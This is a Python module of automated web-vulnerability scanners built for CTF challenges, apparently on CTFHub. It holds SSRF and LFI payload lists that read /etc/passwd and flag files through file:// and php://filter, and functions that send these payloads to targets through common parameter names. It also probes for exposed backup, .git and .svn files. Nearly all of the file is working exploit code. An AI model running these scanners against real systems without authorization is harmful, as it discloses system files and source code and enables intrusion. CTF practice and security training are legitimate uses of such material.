#!/usr/bin/env python3
"""Quick vulnerability scanners for CTF target exploration.

Each scanner takes a target URL + optional exploration data and returns
(flag: Optional[str], findings: List[dict]). Designed to be called by
the coordinator or standalone during manual analysis.
"""

import base64
import re
import requests
from typing import Any, Dict, List, Optional, Tuple

# ── Payload dictionaries ────────────────────────────────────────────────────

SSRF_PAYLOADS = [
    "file:///flag",
    "file:///flag.txt",
    "file:///etc/passwd",
    "file:///var/www/html/flag.php",
    "http://127.0.0.1/flag.php",
    "http://127.0.0.1/",
]

LFI_PAYLOADS = [
    "/flag",
    "/etc/passwd",
    "php://filter/convert.base64-encode/resource=/flag",
    "php://filter/convert.base64-encode/resource=flag.php",
]

LFI_PARAMS = ["file", "page", "include", "path", "template", "view", "lang", "load"]

BACKUP_EXTENSIONS = [".swp", ".swo", ".bak", ".old", "~", ".save", ".orig"]
BACKUP_BASES = ["index.php", "flag.php", "config.php", "admin.php", "user.php",
                "login.php", ".htaccess", "app.py", "main.py"]


# ── Scanner functions ───────────────────────────────────────────────────────

def scan_ssrf(target_url: str, forms: List[str] = None,
              endpoints: List[str] = None) -> Tuple[Optional[str], List[Dict]]:
    """Auto-exploit SSRF via file://, gopher://, dict:// protocols.

    Returns (flag, findings_list).
    """
    findings = []
    test_urls = set()

    if forms:
        for ep in forms:
            test_urls.add(ep if ep.startswith("http") else target_url.rstrip("/") + "/" + ep.lstrip("/"))
    if endpoints:
        for ep in endpoints:
            test_urls.add(ep if ep.startswith("http") else target_url.rstrip("/") + "/" + ep.lstrip("/"))
    if not test_urls:
        test_urls.add(target_url + "/modify.php")
        test_urls.add(target_url + "/user.php")

    fields = ["host", "url", "target", "website", "site", "path"]

    for test_url in test_urls:
        for payload in SSRF_PAYLOADS:
            for field in fields:
                try:
                    r = requests.post(test_url, data={field: payload}, timeout=5)
                    m = re.search(r"ctfhub\{[a-f0-9]+\}", r.text)
                    if m:
                        findings.append({"type": "SSRF_FLAG", "url": test_url,
                                        "field": field, "payload": payload})
                        return m.group(0), findings
                    if "root:" in r.text:
                        findings.append({"type": "SSRF_PASSWD", "url": test_url,
                                        "field": field, "payload": payload,
                                        "size": len(r.text)})
                except Exception:
                    pass

    return None, findings


def scan_backup(target_url: str) -> Tuple[Optional[str], List[Dict]]:
    """Scan for backup/source files and extract flags from leaked source.

    Returns (flag, findings_list).
    """
    findings = []
    base_url = target_url.rstrip("/")

    for base in BACKUP_BASES:
        for ext in BACKUP_EXTENSIONS:
            url = f"{base_url}/.{base}{ext}"
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200 and len(r.text) > 20:
                    findings.append({"type": "BACKUP_FOUND", "url": url,
                                    "size": len(r.text)})
                    # Check for flag in content
                    m = re.search(r"ctfhub\{[a-f0-9]+\}", r.text)
                    if m:
                        return m.group(0), findings
                    # Check for flag variable assignment
                    if "flag" in r.text.lower():
                        m2 = re.search(
                            r'(?:flag|FLAG)\s*[=:]\s*["\'](ctfhub\{[^}]+\})',
                            r.text)
                        if m2:
                            return m2.group(1), findings
            except Exception:
                pass

    # Also check common paths
    for path in ["robots.txt", "sitemap.xml", ".git/HEAD", ".svn/entries",
                 ".DS_Store", "README.md", "composer.json", "package.json"]:
        try:
            r = requests.get(f"{base_url}/{path}", timeout=5)
            if r.status_code == 200 and len(r.text) > 10:
                findings.append({"type": "HIDDEN_FILE", "url": path,
                                "size": len(r.text)})
        except Exception:
            pass

    return None, findings


def scan_lfi(target_url: str) -> Tuple[Optional[str], List[Dict]]:
    """Auto-exploit LFI for flag reading.

    Returns (flag, findings_list).
    """
    findings = []

    for param in LFI_PARAMS:
        for payload in LFI_PAYLOADS:
            try:
                r = requests.get(target_url, params={param: payload}, timeout=5)
                text = r.text
                m = re.search(r"ctfhub\{[a-f0-9]+\}", text)
                if m:
                    findings.append({"type": "LFI_FLAG", "param": param,
                                    "payload": payload})
                    return m.group(0), findings
                if "root:" in text:
                    findings.append({"type": "LFI_PASSWD", "param": param,
                                    "payload": payload, "size": len(text)})
                # Check base64-encoded output (php://filter)
                b64_match = re.search(r"([A-Za-z0-9+/=]{30,})", text)
                if b64_match:
                    try:
                        decoded = base64.b64decode(b64_match.group(1)).decode(
                            "utf-8", errors="ignore")
                        fm = re.search(r"ctfhub\{[a-f0-9]+\}", decoded)
                        if fm:
                            findings.append({"type": "LFI_B64_FLAG", "param": param})
                            return fm.group(0), findings
                    except Exception:
                        pass
            except Exception:
                pass

    return None, findings


def quick_recon(target_url: str) -> Dict[str, Any]:
    """Basic recon: grab page title, discover forms/endpoints."""
    data: Dict[str, Any] = {
        "endpoints": [], "forms": [], "title": None,
        "page_size": 0, "error": None,
    }

    try:
        r = requests.get(target_url, timeout=10, allow_redirects=True)
        data["page_size"] = len(r.text)

        title_m = re.search(r"<title>(.*?)</title>", r.text, re.I)
        if title_m:
            data["title"] = title_m.group(1)

        # Discover PHP endpoints
        hrefs = re.findall(r'href="([^"]*\.php[^"]*)"', r.text, re.I)
        actions = re.findall(r'action="([^"]*\.php[^"]*)"', r.text, re.I)
        srcs = re.findall(r'src="([^"]*\.php[^"]*)"', r.text, re.I)
        data["endpoints"] = list(set(hrefs + actions + srcs))

        # Discover forms
        form_actions = re.findall(r'<form[^>]*action="([^"]*)"', r.text, re.I)
        data["forms"] = list(set(form_actions))
    except Exception as e:
        data["error"] = str(e)

    return data


def scan_vulnerability(target_url: str, pattern_id: str) -> Tuple[Optional[str], List[Dict]]:
    """Dispatch to the right scanner based on pattern ID.

    Args:
        target_url: Target challenge URL.
        pattern_id: Pattern ID from ctf_patterns (e.g., 'ssrf_curl_file', 'lfi_include').

    Returns:
        (flag or None, findings list).
    """
    recon = quick_recon(target_url)

    if pattern_id.startswith("ssrf"):
        return scan_ssrf(target_url, forms=recon.get("forms", []),
                        endpoints=recon.get("endpoints", []))
    elif pattern_id.startswith("lfi") or pattern_id.startswith("file_inclusion"):
        return scan_lfi(target_url)
    elif pattern_id.startswith("backup"):
        return scan_backup(target_url)
    # SQLi/deserialization/RCE need manual/specialized tools
    else:
        return None, [{"type": "RECON", "data": recon}]
